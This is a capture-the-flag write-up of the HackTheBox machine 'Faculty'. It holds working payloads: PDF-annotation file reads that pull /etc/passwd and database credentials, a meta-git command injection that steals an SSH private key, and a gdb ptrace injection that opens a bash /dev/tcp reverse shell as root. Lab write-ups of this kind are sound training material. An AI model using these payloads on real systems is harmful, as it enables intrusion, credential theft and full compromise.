---
layout: post
title: HackTheBox - Faculty
category: HackTheBox
tags: machines linux web sqli capabilities xss cve
date: 2022-08-09 21:18 +0300
---

![Machine logo](/assets/hackthebox/faculty/Faculty.png){:height="414px" width="615px"}

# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```zsh
$ sudo openvpn lab_access_file.ovpn
```

You have to be accurate here, you must understand that your machine is becoming accessable for other users in the VPN network. So you have to protect yourself by setting up a strong password and turning off unused services on your machine. Make sure you have a strong system and others can't harm you.

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ echo "10.10.11.169    faculty" | sudo tee -a /etc/hosts       
10.10.11.169    faculty
```

# Reconnaissance

## Port scan

I like to scan ports with `masscan` and `nmap`. Masscan is a fastest asynchronous port scanner in the world now. The developer says this tool can scan the whole Internet in 5 minutes from a single machine.

I start with all ports (including UDP) of a Faculty's IP address and redirect it to a text file.

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ sudo masscan --rate=1000 -e tun0 -p1-65535,U:1-65535 10.10.11.169 > ports
```

Then, I perform a `STROPS` (string operations) to convert the result file in one line separated by commas and save this line to a variable. With the second command I checked the variable.

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
                                                                                                                                            
┌──(kali㉿workstation)-[~/Faculty]
└─$ echo $ports                                            
22,80
```

With ports in variable I can start nmap.

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ nmap -n -Pn -sV -sC -oA nmap_faculty -p$ports faculty
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 15:38 UTC
Nmap scan report for faculty (10.10.11.169)
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
```

Nmap says that it is Ubuntu Bionic (18.04), we can note it in [SSH banner](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5). We have opened ports 22 and 80. There is a `http` server `faculty.htb`, let's add it to our /etc/hosts and explore it.

> In /etc/hosts:
> 10.10.11.169    faculty faculty.htb

## Port 80 - web server

![Web server](/assets/hackthebox/faculty/web-server.png)

We can see a login page. We don't know the ID number and some random IDs haven't worked. So I've tried to perform a `SQLi` (SQL Injection) here.

![SQLi attack](/assets/hackthebox/faculty/SQLi.gif)

There is a schedule page with nothing interesting. But in source code we can find a links to `/admin/` page. Let's move to it.

![admin page link](/assets/hackthebox/faculty/source-link.png)

![admin page](/assets/hackthebox/faculty/admin-page.png)

We can see an admin page with course/subject/faculty tabs. We can see some lists in them. Also, we can exprot them to `PDF` format and we can edit the list. Let's try to check if we could inject some `HTML` code into.

![Inject html code](/assets/hackthebox/faculty/html_inject.png)

We've got a possible `XSS` there. For the Proof of Concept I've tried to inject [local file reading](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file) code to read /etc/passwd on the server. The code will look like this:

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

We download a PDF. Now I've had some troubles, because I didn't know about how to look for an attachments in Firefox browser 😂. I was stucked so hard on this... So, if you just like me think the PoC doesn't work, just toggle the sidebar on the left corner in browser!

![sidebar](/assets/hackthebox/faculty/sidebar.png)

In passwd file we can find 2 interesting users for us:

```
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
...
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

## Initial access

And we noted that SSH is enabled on the server, but when I checked for their id_rsa keys with a PDF file read, I haven't found anything. So we have to enumerate the webserver more. I've started BurpSuite and checked for requests on some pages.

When we try to open /index.php after first login, we can see an interesting thing. We also make a POST request to /admin/ajax.php?action=get_schecdule with faculty_id=1 parameter. We can try to make it crash to get an error by changing the parameter to "test":

![post_request](/assets/hackthebox/faculty/post_request.png)

Now we've got a full path to web application program. Let's get it with our previous PDF exploit. The payload will look like that:

```html
<annotation file="/var/www/scheduling/admin/admin_class.php" content="/var/www/scheduling/admin/admin_class.php" icon="Graph" title="Attached File: /var/www/scheduling/admin/admin_class.php" pos-x="195" />
```

In downloaded admin_class.php we can see that it includes `db_connect.php`.

![db_connect in admin_class](/assets/hackthebox/faculty/admin_class.png)

In that file there must a database credentials. We download it with our exploit and open it.

```html
<annotation file="/var/www/scheduling/admin/db_connect.php" content="/var/www/scheduling/admin/db_connect.php" icon="Graph" title="Attached File: /var/www/scheduling/admin/db_connect.php" pos-x="195" />
```

![database credentials](/assets/hackthebox/faculty/db_credentials.png)

Now we can try to use this credentials in SSH. They won't work for a user developer, but will with the gbyolo user.

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ ssh gbyolo@faculty 
gbyolo@faculty's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  9 17:36:12 CEST 2022

  System load:  0.0               Processes:             222
  Usage of /:   74.9% of 4.67GB   Users logged in:       0
  Memory usage: 34%               IPv4 address for eth0: 10.10.11.169
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
gbyolo@faculty:~$
```

We've got an initial access! Unfortunately, there is no user flag, so we have to get the developer user.

# user.txt

## Explore the system

For more convenience I import my alias on the machine:

```bash
gbyolo@faculty:~$ alias ll='ls -lsaht --color=auto'
```

When we connected via ssh, we've saw a message about gbyolo's mail. Let's read it.

```bash
gbyolo@faculty:~$ ll /var/mail
total 12K
4.0K drwxr-xr-x 13 root   root 4.0K Jun 23 18:50 ..
4.0K drwxrwsr-x  2 root   mail 4.0K Jun 23 18:50 .
4.0K -rw-------  1 gbyolo mail  677 Nov 10  2020 gbyolo
gbyolo@faculty:~$ cat /var/mail/gbyolo 
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

It says that we can use git with `faculty` group, but we can't see it if we use the `id` command:

```bash
gbyolo@faculty:/$ id
uid=1000(gbyolo) gid=1000(gbyolo) groups=1000(gbyolo)
```

But if we check `sudo` permissions we can see that we can run meta-git command as a developer user.

```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Sorry, try again.
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

## Exploit for lateral movement

Now we just need to google how to exploit it. I've found [this report](https://hackerone.com/reports/728040) by just googling "meta-git exploit", so we're cool! It gives us a RCE as a developer user. We probably could get a shell, but I tried to read deleloper's `id_rsa` and it has worked!

```bash
gbyolo@faculty:/$ sudo -u developer /usr/local/bin/meta-git clone 'test||cat /home/developer/.ssh/id_rsa'
```

![developer's id_rsa](/assets/hackthebox/faculty/developer_id_rsa.png)

Now we just copy the private key, change it's permissions and login as a developer user to get the flag!

![user.txt](/assets/hackthebox/faculty/user_txt.png)


# root.txt

## Exploring for privesc

By performing a basic enumeration we can see that developer user has got more groups than usual:

```bash
developer@faculty:~$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
```

Let's search for a files associated with this groups.

```bash
developer@faculty:~$ find / -group debug 2>/dev/null
/usr/bin/gdb
developer@faculty:~$ find / -group faculty 2>/dev/null
```

We've got a gdb, which allows us to see what is going on inside another program while it executes. Let's check if it has capabilities, we can check it with `getcap`:

```bash
developer@faculty:~$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

And can be used to debug a process from the host and make it call the system function. You can read about this technique on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace).

To exploit it, we need to find a process with `SYS_ADMIN` capability set. It usually sets on root owned processes, so let's find a process to execute with `ps`.

![process list](/assets/hackthebox/faculty/process_list.png)

`Python3` is really interesting for us. Let's search for it's capabilities:

```bash
developer@faculty:~$ cat /proc/733/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
developer@faculty:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

And we got it. Let's perform our attack!

## Exploit

Now we just have to interact the process and call a system function to get a reverse shell. We need to set up a listener and perform the exploit.

On our attacking machine:

```zsh
┌──(kali㉿workstation)-[~/Faculty]
└─$ nc -lnvp <PORT>
```

On victim's machine:

```bash
developer@faculty:~$ gdb -p 733
... Very big output ...
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")
```

![rooted](/assets/hackthebox/faculty/rooted.png)

It worked! The box is pwned!

![pwned](/assets/hackthebox/faculty/pwned.png)

# Conclusion

It was a really cool box, It was so fun to understand that I solved the problem, but I just didn't know about PDFs in Firefox. A privilege escalation was cool too, I've never exploited anything like that.

Thank you for reading, I hope it was useful for you ❤️
